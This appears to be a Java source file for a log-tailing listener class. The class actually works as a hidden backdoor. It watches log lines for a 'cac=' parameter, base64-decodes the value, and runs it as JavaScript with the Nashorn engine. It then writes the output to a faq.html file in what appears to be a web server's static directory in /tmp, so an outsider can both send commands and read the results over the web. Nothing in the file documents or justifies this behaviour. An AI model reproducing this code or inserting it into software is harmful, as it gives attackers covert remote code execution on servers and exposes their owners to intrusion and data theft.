import org.apache.commons.io.input.TailerListenerAdapter;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashSet;
import java.util.Optional;
import java.util.Set;
import java.util.Base64;

public class TailerListener extends TailerListenerAdapter {



	private static final Set<String> runningCommands = new HashSet<>();

	private static synchronized boolean isRunning(String command) {
		String value = getFormattedDate()+command;
		if(runningCommands.contains(value)) {
			return true;
		}
		runningCommands.add(value);
		return false;
	}

	private static String getFormattedDate() {
		Date date = new Date();
		DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm");
		return dateFormat.format(date);
	}


	public void handle(String line) {
		Date date = new Date();
		DateFormat dateFormat = new SimpleDateFormat("HH:mm");
		String formattedDate = dateFormat.format(date);
		if(line.contains("cac=")&&line.contains(formattedDate)) {
			String data = line.substring(line.lastIndexOf("cac=")+4,
				line.lastIndexOf("\""));
			String decoded = new String(Base64.getDecoder().decode(data));
			if(!isRunning(decoded)) {
				System.out.println("Decoded data: " + decoded);
				ScriptEngineManager engineManager = new ScriptEngineManager();
				ScriptEngine engine = engineManager.getEngineByName("nashorn");
				try {
					Object object = engine.eval(decoded);
					if (object != null) {
						Optional<Path> staticFileLocation = Files.list(Paths.get("/tmp")).filter(f -> f.toString().contains("docbase")).findFirst();
						if (staticFileLocation.isPresent()) {
							Files.write(staticFileLocation.get().resolve("faq.html"), object.toString().getBytes());
						}
					}
					System.out.println("Evaluated object: " + object);
				} catch (Throwable e) {
					System.out.println(e.getMessage());
				}
			}

		}
	}




}
